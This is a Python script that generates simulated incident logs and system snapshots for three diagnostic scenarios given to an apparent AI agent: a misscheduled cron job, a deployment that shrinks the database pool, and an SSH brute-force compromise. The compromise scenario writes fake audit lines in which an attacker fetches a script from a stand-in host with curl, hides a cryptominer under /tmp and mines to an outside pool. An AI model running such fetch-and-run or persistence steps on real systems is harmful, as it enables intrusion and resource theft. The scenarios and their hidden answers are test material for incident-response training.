"""
Generates the simulated incidents (one folder per scenario in ./sample_data/).

Each scenario has a hidden story the agent must discover on its own, plus unrelated
"noise" so it has to separate signal from distraction.

runaway_job
  08:57  an approved crontab change mistakenly moves the heavy `report_export.py --full`
         job from 02:00 to 09:00 -> unbounded query, CPU/memory exhaustion, DB pool full,
         OOM-killer kills gunicorn, app.service restart-loops, nginx 502/504.

bad_deployment
  10:00  release v2.8.0 ships a refactored settings loader; app.env now has DB_POOL_SIZE=2
         (was 20). The server is NOT overloaded (CPU ~20%) - requests queue for one of only
         2 DB connections and time out -> HTTP 500/504. Red herring: a DB migration that ran
         successfully in the same release.

security_incident
  02:00  SSH brute-force from 198.51.100.23 against many usernames; 02:11 a weak password on
         the `deploy` account is guessed; the attacker downloads a cryptominer to /tmp, adds an
         @reboot crontab for persistence (no change ticket) and mines to 203.0.113.50:3333.
         CPU ~100% on all cores, the app becomes slow and gunicorn workers time out.
         Red herring: a legitimate `ops` login from the internal network.

Run:  python generate_sample_data.py
"""
import json
import random
import shutil
from pathlib import Path

ROOT = Path(__file__).parent / "sample_data"
DAY = "2026-11-23"
ENDPOINTS = ["/api/orders", "/api/products", "/api/customers", "/api/checkout", "/api/health"]


def m(h, mi):
    return h * 60 + mi


def hms(minute_total, sec):
    return f"{minute_total // 60:02d}:{minute_total % 60:02d}:{sec:02d}"


class Scenario:
    """Collects log lines and JSON snapshots for one scenario, then writes them to disk."""

    def __init__(self, key, seed=42):
        self.key, self.rnd = key, random.Random(seed)
        self.logs = {"application": [], "syslog": [], "nginx": [], "auth": []}
        self.json = {}

    def add(self, log, ts, level, src, msg):
        self.logs[log].append((ts, f"{DAY} {ts} {level:<8} [{src}] {msg}"))

    def write(self):
        out = ROOT / self.key
        out.mkdir(parents=True, exist_ok=True)
        files = {"application": "application.log", "syslog": "syslog.log", "nginx": "nginx_error.log", "auth": "auth.log"}
        for name, fname in files.items():
            lines = sorted(self.logs[name], key=lambda x: x[0])
            (out / fname).write_text("\n".join(l for _, l in lines) + "\n", encoding="utf-8")
        for fname, data in self.json.items():
            (out / fname).write_text(json.dumps(data, indent=2), encoding="utf-8")
        counts = ", ".join(f"{n}={len(v)}" for n, v in self.logs.items())
        print(f"{self.key}: {counts} lines; json: {', '.join(self.json)}")


def metric(t, cpu, mem, load, swap, conns):
    return {"time": f"{t // 60:02d}:{t % 60:02d}", "cpu_percent": round(cpu, 1), "memory_percent": round(mem, 1),
            "load_1m": round(load, 2), "swap_percent": round(swap, 1), "db_connections": int(conns)}


def normal_auth(s, start, end, ops_time):
    """Background SSH noise every scenario has: internet scanners + a legitimate admin login."""
    r = s.rnd
    for t in range(start, end, 7):
        ip = f"203.0.113.{r.randint(100, 200)}"
        s.add("auth", hms(t, r.randint(0, 59)), "WARNING", "sshd",
              f"Invalid user {r.choice(['test', 'oracle', 'pi'])} from {ip} port {r.randint(30000, 60000)}")
    s.add("auth", ops_time, "INFO", "sshd", "Accepted publickey for ops from 10.0.4.5 port 52114 ssh2: ED25519 SHA256:q1w2e3")
    s.add("auth", ops_time, "INFO", "systemd-logind", "New session 812 of user ops.")


def common_services(app_state, app_detail, extra=None):
    services = [
        {"name": "app.service", "state": app_state, "detail": app_detail},
        {"name": "nginx.service", "state": "active", "detail": "running"},
        {"name": "postgresql.service", "state": "active", "detail": "running"},
        {"name": "redis-server.service", "state": "active", "detail": "running normally"},
        {"name": "cron.service", "state": "active", "detail": "running"},
        {"name": "ssh.service", "state": "active", "detail": "running, PasswordAuthentication yes"},
    ]
    for name, patch in (extra or {}).items():
        next(x for x in services if x["name"] == name).update(patch)
    return services


# ====================================================================== runaway_job
def runaway_job():
    s = Scenario("runaway_job")
    rnd, add = s.rnd, s.add
    START, END = m(8, 50), m(9, 30)

    for t in range(START, END + 1):
        if t >= m(9, 15):  # app is down after this point
            continue
        n = rnd.randint(2, 4) if t < m(9, 5) else rnd.randint(1, 2)
        for _ in range(n):
            ep = rnd.choice(ENDPOINTS)
            if t < m(9, 5):
                ms = rnd.randint(25, 140) + (0 if t < m(9, 2) else rnd.randint(100, 900))
                add("application", hms(t, rnd.randint(0, 59)), "INFO", "http", f"GET {ep} 200 {ms}ms")

    # noise
    add("application", "08:51:12", "WARNING", "app", "DeprecationWarning: pydantic v1 style validators will be removed in a future release")
    add("application", "08:55:40", "WARNING", "tls", "TLS certificate for api.internal.example expires in 29 days")
    add("application", "08:58:05", "WARNING", "cache", "Redis cache miss ratio 34% for key prefix 'product:'")
    add("syslog", "08:52:00", "INFO", "systemd", "Started Daily apt download activities.")
    add("syslog", "08:53:31", "WARNING", "rsyslog", "Disk usage on /var/log at 91% (consider log rotation)")
    add("nginx", "08:54:10", "WARNING", "nginx", 'client sent invalid method while reading client request line, client: 203.0.113.9, request: "\\x16\\x03\\x01"')
    add("nginx", "08:56:44", "WARNING", "nginx", 'client sent invalid method while reading client request line, client: 203.0.113.9, request: "\\x16\\x03\\x01"')
    normal_auth(s, START, END, "08:56:02")
    add("auth", "08:57:30", "INFO", "sudo", "deploy : TTY=pts/1 ; PWD=/opt/app ; USER=deploy ; COMMAND=/usr/bin/crontab -e")

    # trigger
    add("syslog", "08:57:41", "INFO", "crontab", "(deploy) REPLACE (deploy)")
    add("syslog", "08:57:42", "INFO", "crontab", "(deploy) END EDIT (deploy)")
    add("syslog", "09:00:01", "INFO", "CRON", "(deploy) CMD (/opt/app/jobs/report_export.py --full)")
    add("application", "09:00:03", "INFO", "scheduler", "Starting job report-export (pid 4821) triggered by cron")
    add("application", "09:00:09", "INFO", "report-export",
        "Executing: SELECT * FROM orders JOIN order_items USING (order_id) JOIN customers USING (customer_id) -- no LIMIT, estimated rows=2400000")

    # degradation
    for t, used in {2: 11, 3: 14, 4: 17, 5: 19, 6: 20, 7: 20, 8: 20}.items():
        ts = m(9, t)
        add("application", hms(ts, rnd.randint(1, 20)), "WARNING", "db.pool", f"Connection pool usage {used}/20")
        add("application", hms(ts, rnd.randint(21, 50)), "WARNING", "db.slow",
            f"Slow query detected ({rnd.randint(6, 28)}.{rnd.randint(0, 9)}s): SELECT * FROM orders WHERE customer_id = ?")
    for t in range(m(9, 5), m(9, 15)):
        for _ in range(rnd.randint(2, 4) if t < m(9, 12) else rnd.randint(3, 6)):
            sec = rnd.randint(0, 59)
            add("application", hms(t, sec), "ERROR", "db.pool",
                "Database connection timeout after 30s (QueuePool limit of size 20 overflow 0 reached)")
            ep = rnd.choice(["/api/orders", "/api/checkout", "/api/customers"])
            add("application", hms(t, min(59, sec + 1)), "ERROR", "http", f"{'GET' if ep != '/api/checkout' else 'POST'} {ep} 500 30012ms")
        if t in (m(9, 9), m(9, 11)):
            add("application", hms(t, 30), "WARNING", "db.pool", "Retry limit exceeded (3/3) for request, giving up")
    for t in range(m(9, 6), m(9, 15)):
        for _ in range(rnd.randint(1, 3)):
            add("nginx", hms(t, rnd.randint(0, 59)), "ERROR", "nginx",
                f'upstream timed out (110: Connection timed out) while reading response header from upstream, client: 10.0.4.{rnd.randint(10, 60)}, request: "GET /api/orders HTTP/1.1"')

    # memory exhaustion + crash
    add("syslog", "09:12:40", "WARNING", "kernel", "Memory cgroup stats: usage 15.6GB of 16GB, swap 6.4GB of 8GB in use")
    add("syslog", "09:13:58", "CRITICAL", "kernel", "Out of memory: Killed process 4902 (gunicorn) total-vm:3412880kB, anon-rss:1790220kB")
    add("syslog", "09:14:19", "CRITICAL", "kernel", "Out of memory: Killed process 5011 (gunicorn) total-vm:3398112kB, anon-rss:1765004kB")
    add("application", "09:13:59", "CRITICAL", "worker", "Worker pid 4902 exited unexpectedly (signal 9)")
    add("application", "09:14:20", "CRITICAL", "worker", "Worker pid 5011 exited unexpectedly (signal 9)")
    add("syslog", "09:14:21", "ERROR", "systemd", "app.service: Main process exited, code=killed, status=9/KILL")
    add("syslog", "09:14:21", "ERROR", "systemd", "app.service: Failed with result 'signal'.")
    for i, (mi, sec) in enumerate([(14, 31), (14, 58), (15, 24), (15, 50), (16, 17)], start=1):
        add("syslog", hms(m(9, mi), sec), "INFO", "systemd", f"app.service: Scheduled restart job, restart counter is at {i}.")
        add("application", hms(m(9, mi), sec + 3 if sec < 56 else 59), "ERROR", "app",
            "Failed to start application: [Errno 12] Cannot allocate memory" if i % 2 else "Failed to start application: database unavailable (connection pool could not be initialised)")
    add("syslog", "09:16:40", "ERROR", "systemd", "app.service: Start request repeated too quickly.")
    add("syslog", "09:16:40", "ERROR", "systemd", "Failed to start Application Service.")
    for t in range(m(9, 15), m(9, 22)):
        add("application", hms(t, rnd.randint(0, 59)), "ERROR", "healthcheck", "Health check failed: /api/health unreachable")
        for _ in range(rnd.randint(1, 3)):
            add("nginx", hms(t, rnd.randint(0, 59)), "ERROR", "nginx",
                f'connect() failed (111: Connection refused) while connecting to upstream, client: 10.0.4.{rnd.randint(10, 60)}, request: "GET /api/orders HTTP/1.1"')
    add("application", "09:21:30", "INFO", "report-export", "Job report-export (pid 4821) still running: 1.9M of 2.4M rows fetched")

    metrics = []
    for t in range(START, END + 1):
        since = t - m(9, 0)
        if since < 0:
            vals = (rnd.uniform(20, 30), rnd.uniform(50, 54), rnd.uniform(0.6, 1.1), rnd.uniform(1, 3), rnd.randint(6, 10))
        else:
            vals = (min(98, 30 + since * 22) if since < 3 else rnd.uniform(88, 98),
                    min(97.5, 52 + since * 3.4) if since <= 13 else rnd.uniform(70, 78),
                    min(14.0, 1 + since * 1.1) if since < 12 else rnd.uniform(11, 14),
                    min(82, 3 + since * 6) if since <= 13 else rnd.uniform(70, 80),
                    min(20, 8 + since * 2) if since < 15 else rnd.randint(2, 6))
        metrics.append(metric(t, *vals))
    s.json["metrics.json"] = metrics
    s.json["processes.json"] = {
        "snapshot_time": "09:20", "cpu_cores": 8, "total_memory_gb": 16,
        "processes": [
            {"pid": 4821, "user": "deploy", "command": "python /opt/app/jobs/report_export.py --full", "cpu_percent": 94.2, "memory_gb": 9.8, "runtime": "20m"},
            {"pid": 1377, "user": "postgres", "command": "postgres: app_db app_user [local] SELECT", "cpu_percent": 71.5, "memory_gb": 2.1, "runtime": "3d"},
            {"pid": 1380, "user": "postgres", "command": "postgres: app_db app_user [local] SELECT", "cpu_percent": 63.0, "memory_gb": 1.9, "runtime": "3d"},
            {"pid": 912, "user": "redis", "command": "redis-server *:6379", "cpu_percent": 1.2, "memory_gb": 0.4, "runtime": "3d"},
            {"pid": 880, "user": "www-data", "command": "nginx: worker process", "cpu_percent": 0.8, "memory_gb": 0.1, "runtime": "3d"},
        ]}
    s.json["services.json"] = {"snapshot_time": "09:20", "services": common_services(
        "failed", "restart loop, 5 restarts, start request repeated too quickly",
        {"nginx.service": {"detail": "running, upstream (app) unreachable"},
         "postgresql.service": {"detail": "running, 20/20 connections used, long-running SELECTs"}})}
    s.json["disk.json"] = {"filesystems": [
        {"mount": "/", "used_percent": 62, "size_gb": 100},
        {"mount": "/var/log", "used_percent": 91, "size_gb": 20},
        {"mount": "/var/lib/postgresql", "used_percent": 55, "size_gb": 200}]}
    s.json["changes.json"] = [
        {"time": "2026-11-20 16:05", "type": "deployment", "summary": "Release v2.7.3 (bug fixes)", "author": "ci-bot", "ticket": "CHG-1031", "diff": []},
        {"time": "2026-11-23 08:57", "type": "scheduled-job", "summary": "Update report-export cron entry (add --full flag for month-end report)",
         "author": "deploy", "ticket": "CHG-1042",
         "diff": ["- 0 2 * * *  /opt/app/jobs/report_export.py", "+ 0 9 * * *  /opt/app/jobs/report_export.py --full"]},
    ]
    s.json["network.json"] = {"snapshot_time": "09:20", "connections": [
        {"state": "LISTEN", "local": "0.0.0.0:22", "remote": "*", "pid": 701, "process": "sshd"},
        {"state": "LISTEN", "local": "0.0.0.0:443", "remote": "*", "pid": 880, "process": "nginx"},
        {"state": "ESTAB", "local": "127.0.0.1:41822", "remote": "127.0.0.1:5432", "pid": 4821, "process": "python report_export.py"},
        {"state": "ESTAB", "local": "127.0.0.1:6379", "remote": "127.0.0.1:50122", "pid": 912, "process": "redis-server"},
        {"state": "ESTAB", "local": "10.0.4.2:22", "remote": "10.0.4.5:52114", "pid": 7120, "process": "sshd: ops"},
    ]}
    s.write()


# ====================================================================== bad_deployment
def bad_deployment():
    s = Scenario("bad_deployment", seed=7)
    rnd, add = s.rnd, s.add
    START, END, DEPLOY = m(9, 45), m(10, 25), m(10, 1)

    # normal traffic before the release, slow/failed traffic after
    for t in range(START, END + 1):
        for _ in range(rnd.randint(2, 4)):
            ep = rnd.choice(ENDPOINTS)
            if t < DEPLOY:
                add("application", hms(t, rnd.randint(0, 59)), "INFO", "http", f"GET {ep} 200 {rnd.randint(25, 140)}ms")
            elif rnd.random() < 0.35:
                add("application", hms(t, rnd.randint(0, 59)), "INFO", "http", f"GET {ep} 200 {rnd.randint(4000, 19000)}ms")

    # noise
    add("application", "09:47:10", "WARNING", "app", "DeprecationWarning: pydantic v1 style validators will be removed in a future release")
    add("application", "09:52:33", "WARNING", "cache", "Redis cache miss ratio 31% for key prefix 'product:'")
    add("nginx", "09:49:02", "WARNING", "nginx", 'client sent invalid method while reading client request line, client: 203.0.113.9, request: "\\x16\\x03\\x01"')
    add("syslog", "09:50:00", "INFO", "systemd", "Started Daily apt download activities.")
    normal_auth(s, START, END, "09:58:40")

    # the release
    add("syslog", "10:00:12", "INFO", "deploy", "ci-bot: deploying release v2.8.0 (commit 9f3c2ab 'refactor settings loader') to app01")
    add("application", "10:00:20", "INFO", "migrate", "Applying migration 0042_add_index_orders_created_at ... OK (4.2s)")
    add("syslog", "10:00:41", "INFO", "systemd", "Stopping Application Service...")
    add("syslog", "10:00:44", "INFO", "systemd", "Started Application Service.")
    add("application", "10:00:46", "INFO", "app", "Starting app v2.8.0 with 8 gunicorn workers")
    add("application", "10:00:47", "INFO", "settings", "Loaded settings from /opt/app/app.env (DB_POOL_SIZE=2, DB_MAX_OVERFLOW=0, DB_POOL_TIMEOUT=30)")
    add("application", "10:00:47", "INFO", "db.pool", "Database pool initialised (size=2, overflow=0)")
    add("application", "10:00:48", "WARNING", "settings", "Unknown setting 'DATABASE_POOL_SIZE' in app.env ignored (did you mean 'DB_POOL_SIZE'?)")
    add("syslog", "10:01:05", "INFO", "deploy", "ci-bot: release v2.8.0 deployed, health check /api/health 200 OK")

    # symptoms: requests queue for 2 connections
    for t in range(m(10, 2), END + 1):
        add("application", hms(t, rnd.randint(0, 20)), "WARNING", "db.pool", f"Connection pool usage 2/2, {rnd.randint(9, 40)} requests waiting")
        for _ in range(rnd.randint(2, 5)):
            sec = rnd.randint(0, 58)
            add("application", hms(t, sec), "ERROR", "db.pool",
                "Database connection timeout after 30s (QueuePool limit of size 2 overflow 0 reached)")
            ep = rnd.choice(["/api/orders", "/api/checkout", "/api/customers", "/api/products"])
            add("application", hms(t, sec + 1), "ERROR", "http", f"{'POST' if ep == '/api/checkout' else 'GET'} {ep} 500 30008ms")
        for _ in range(rnd.randint(1, 3)):
            add("nginx", hms(t, rnd.randint(0, 59)), "ERROR", "nginx",
                f'upstream timed out (110: Connection timed out) while reading response header from upstream, client: 10.0.4.{rnd.randint(10, 60)}, request: "GET /api/orders HTTP/1.1"')
    for t in (m(10, 6), m(10, 13), m(10, 21)):
        add("application", hms(t, 40), "WARNING", "healthcheck", "Health check slow: /api/health 200 in 12.4s (threshold 2s)")

    metrics = []
    for t in range(START, END + 1):
        after = t >= DEPLOY
        metrics.append(metric(t, rnd.uniform(14, 24) if after else rnd.uniform(22, 32), rnd.uniform(48, 53),
                              rnd.uniform(0.4, 0.9) if after else rnd.uniform(0.7, 1.2), rnd.uniform(1, 2),
                              2 if after else rnd.randint(7, 12)))
    s.json["metrics.json"] = metrics
    s.json["processes.json"] = {
        "snapshot_time": "10:20", "cpu_cores": 8, "total_memory_gb": 16,
        "processes": [
            {"pid": 9120, "user": "app", "command": "gunicorn: master [app v2.8.0]", "cpu_percent": 4.1, "memory_gb": 0.3, "runtime": "20m"},
            {"pid": 9131, "user": "app", "command": "gunicorn: worker [app v2.8.0]", "cpu_percent": 2.8, "memory_gb": 0.4, "runtime": "20m"},
            {"pid": 1377, "user": "postgres", "command": "postgres: app_db app_user [local] idle in transaction", "cpu_percent": 3.5, "memory_gb": 0.6, "runtime": "20m"},
            {"pid": 912, "user": "redis", "command": "redis-server *:6379", "cpu_percent": 0.9, "memory_gb": 0.4, "runtime": "5d"},
            {"pid": 880, "user": "www-data", "command": "nginx: worker process", "cpu_percent": 0.7, "memory_gb": 0.1, "runtime": "5d"},
        ]}
    s.json["services.json"] = {"snapshot_time": "10:20", "services": common_services(
        "active", "running v2.8.0 since 10:00:44, health check slow (12s)",
        {"nginx.service": {"detail": "running, many upstream timeouts"},
         "postgresql.service": {"detail": "running, only 2 connections from app (max_connections 100)"}})}
    s.json["disk.json"] = {"filesystems": [
        {"mount": "/", "used_percent": 58, "size_gb": 100},
        {"mount": "/var/log", "used_percent": 64, "size_gb": 20},
        {"mount": "/var/lib/postgresql", "used_percent": 55, "size_gb": 200}]}
    s.json["changes.json"] = [
        {"time": "2026-11-21 11:30", "type": "config", "summary": "nginx: switch access log to JSON format", "author": "ops", "ticket": "CHG-1037", "diff": []},
        {"time": "2026-11-23 10:00", "type": "deployment", "summary": "Release v2.8.0: refactor settings loader, add index on orders.created_at",
         "author": "ci-bot", "ticket": "CHG-1045",
         "diff": ["app.env:", "- DATABASE_POOL_SIZE=20", "- DATABASE_MAX_OVERFLOW=10",
                  "+ DATABASE_POOL_SIZE=20   # old name, no longer read by v2.8.0", "+ DB_POOL_SIZE=2          # copied from local dev .env",
                  "+ DB_MAX_OVERFLOW=0", "migrations: + 0042_add_index_orders_created_at"]},
    ]
    s.json["network.json"] = {"snapshot_time": "10:20", "connections": [
        {"state": "LISTEN", "local": "0.0.0.0:22", "remote": "*", "pid": 701, "process": "sshd"},
        {"state": "LISTEN", "local": "0.0.0.0:443", "remote": "*", "pid": 880, "process": "nginx"},
        {"state": "ESTAB", "local": "127.0.0.1:41830", "remote": "127.0.0.1:5432", "pid": 9131, "process": "gunicorn worker"},
        {"state": "ESTAB", "local": "127.0.0.1:41831", "remote": "127.0.0.1:5432", "pid": 9134, "process": "gunicorn worker"},
        {"state": "ESTAB", "local": "10.0.4.2:22", "remote": "10.0.4.5:52114", "pid": 7120, "process": "sshd: ops"},
    ]}
    s.write()


# ====================================================================== security_incident
def security_incident():
    s = Scenario("security_incident", seed=13)
    rnd, add = s.rnd, s.add
    START, END, MINER = m(1, 50), m(2, 40), m(2, 13)
    ATTACKER, POOL = "198.51.100.23", "203.0.113.50:3333"

    # light night-time traffic; slow after the miner starts
    for t in range(START, END + 1):
        for _ in range(rnd.randint(0, 2)):
            ep = rnd.choice(ENDPOINTS)
            ms = rnd.randint(25, 140) if t < MINER else rnd.randint(2500, 14000)
            add("application", hms(t, rnd.randint(0, 59)), "INFO", "http", f"GET {ep} 200 {ms}ms")

    # noise
    add("application", "01:52:10", "WARNING", "tls", "TLS certificate for api.internal.example expires in 29 days")
    add("syslog", "01:55:00", "INFO", "logrotate", "logrotate: rotated /var/log/nginx/*.log")
    add("nginx", "02:05:44", "WARNING", "nginx", 'client sent invalid method while reading client request line, client: 203.0.113.9, request: "\\x16\\x03\\x01"')
    normal_auth(s, START, END, "02:31:15")  # ops login at 02:31 is the on-call admin - legitimate

    # brute force 02:00 - 02:11
    users = ["root", "admin", "ubuntu", "test", "postgres", "git", "deploy", "oracle", "user"]
    for t in range(m(2, 0), m(2, 11) + 1):
        for _ in range(rnd.randint(18, 30)):
            u = rnd.choice(users)
            msg = (f"Failed password for {u} from {ATTACKER} port {rnd.randint(30000, 65000)} ssh2" if u in ("root", "deploy", "postgres")
                   else f"Failed password for invalid user {u} from {ATTACKER} port {rnd.randint(30000, 65000)} ssh2")
            add("auth", hms(t, rnd.randint(0, 59)), "WARNING", "sshd", msg)
        if t % 3 == 0:
            add("auth", hms(t, 59), "WARNING", "sshd", f"Disconnecting authenticating user root {ATTACKER}: Too many authentication failures [preauth]")

    # compromise
    add("auth", "02:11:37", "INFO", "sshd", f"Accepted password for deploy from {ATTACKER} port 51422 ssh2")
    add("auth", "02:11:37", "INFO", "systemd-logind", "New session 813 of user deploy.")
    add("syslog", "02:12:05", "INFO", "kernel", "audit: type=EXECVE argc=3 a0=\"curl\" a1=\"-s\" a2=\"http://198.51.100.23/k.sh\" uid=1001(deploy)")
    add("syslog", "02:12:09", "INFO", "kernel", "audit: type=EXECVE argc=2 a0=\"chmod\" a1=\"+x\" a2=\"/tmp/.X11-unix/.k/kdevtmpfsi\" uid=1001(deploy)")
    add("syslog", "02:12:40", "INFO", "crontab", "(deploy) REPLACE (deploy)")
    add("syslog", "02:12:41", "INFO", "crontab", "(deploy) END EDIT (deploy)")
    add("syslog", "02:13:02", "INFO", "kernel", "audit: type=EXECVE argc=1 a0=\"/tmp/.X11-unix/.k/kdevtmpfsi\" uid=1001(deploy)")
    add("syslog", "02:13:30", "WARNING", "kernel", "perf: interrupt took too long (5120 > 5000), lowering kernel.perf_event_max_sample_rate")
    add("auth", "02:14:02", "INFO", "sshd", f"Received disconnect from {ATTACKER} port 51422:11: disconnected by user")

    # symptoms
    for t in range(m(2, 15), END + 1, 2):
        add("application", hms(t, rnd.randint(0, 59)), "WARNING", "gunicorn", f"WORKER TIMEOUT (pid:{rnd.randint(9100, 9199)}), restarting worker")
        add("nginx", hms(t, rnd.randint(0, 59)), "ERROR", "nginx",
            f'upstream timed out (110: Connection timed out) while reading response header from upstream, client: 10.0.4.{rnd.randint(10, 60)}, request: "GET /api/products HTTP/1.1"')
    add("application", "02:20:11", "WARNING", "healthcheck", "Health check slow: /api/health 200 in 9.8s (threshold 2s)")

    metrics = []
    for t in range(START, END + 1):
        on = t >= MINER
        metrics.append(metric(t, rnd.uniform(96, 99.5) if on else rnd.uniform(4, 11), rnd.uniform(46, 50) if not on else rnd.uniform(55, 58),
                              rnd.uniform(8.5, 10.5) if on else rnd.uniform(0.2, 0.5), rnd.uniform(1, 2), rnd.randint(2, 5)))
    s.json["metrics.json"] = metrics
    s.json["processes.json"] = {
        "snapshot_time": "02:35", "cpu_cores": 8, "total_memory_gb": 16,
        "processes": [
            {"pid": 6666, "user": "deploy", "command": "/tmp/.X11-unix/.k/kdevtmpfsi -o 203.0.113.50:3333 --threads=8", "cpu_percent": 781.4, "memory_gb": 1.2, "runtime": "22m"},
            {"pid": 9120, "user": "app", "command": "gunicorn: master [app v2.7.3]", "cpu_percent": 3.2, "memory_gb": 0.3, "runtime": "3d"},
            {"pid": 1377, "user": "postgres", "command": "postgres: app_db app_user [local] idle", "cpu_percent": 0.6, "memory_gb": 0.6, "runtime": "3d"},
            {"pid": 912, "user": "redis", "command": "redis-server *:6379", "cpu_percent": 0.4, "memory_gb": 0.4, "runtime": "3d"},
            {"pid": 880, "user": "www-data", "command": "nginx: worker process", "cpu_percent": 0.5, "memory_gb": 0.1, "runtime": "3d"},
        ]}
    s.json["services.json"] = {"snapshot_time": "02:35", "services": common_services(
        "active", "running, workers timing out and restarting",
        {"nginx.service": {"detail": "running, upstream timeouts"}})}
    s.json["disk.json"] = {"filesystems": [
        {"mount": "/", "used_percent": 61, "size_gb": 100},
        {"mount": "/var/log", "used_percent": 70, "size_gb": 20},
        {"mount": "/var/lib/postgresql", "used_percent": 55, "size_gb": 200}]}
    s.json["changes.json"] = [
        {"time": "2026-11-20 16:05", "type": "deployment", "summary": "Release v2.7.3 (bug fixes)", "author": "ci-bot", "ticket": "CHG-1031", "diff": []},
    ]
    s.json["network.json"] = {"snapshot_time": "02:35", "connections": [
        {"state": "LISTEN", "local": "0.0.0.0:22", "remote": "*", "pid": 701, "process": "sshd"},
        {"state": "LISTEN", "local": "0.0.0.0:443", "remote": "*", "pid": 880, "process": "nginx"},
        {"state": "ESTAB", "local": "10.0.4.2:48712", "remote": POOL, "pid": 6666, "process": "kdevtmpfsi"},
        {"state": "ESTAB", "local": "127.0.0.1:41830", "remote": "127.0.0.1:5432", "pid": 9131, "process": "gunicorn worker"},
        {"state": "ESTAB", "local": "10.0.4.2:22", "remote": "10.0.4.5:52114", "pid": 7120, "process": "sshd: ops"},
    ]}
    s.write()


if __name__ == "__main__":
    # old single-scenario layout kept files directly in sample_data/; remove them
    for old in ["application.log", "syslog.log", "nginx_error.log", "metrics.json", "processes.json", "services.json", "disk.json"]:
        (ROOT / old).unlink(missing_ok=True)
    for build in (runaway_job, bad_deployment, security_incident):
        shutil.rmtree(ROOT / build.__name__, ignore_errors=True)
        build()
    print("sample_data generated in", ROOT)
